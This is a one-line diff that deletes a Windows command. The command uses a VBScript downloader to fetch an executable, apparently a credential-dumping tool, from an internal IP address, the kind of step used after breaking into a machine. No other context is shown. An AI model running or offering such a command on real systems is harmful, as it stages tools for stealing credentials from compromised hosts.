@@ -1,1 +1,0 @@
-cscript wget.vbs http://192.168.26.31/wce32.exe wce32.exe
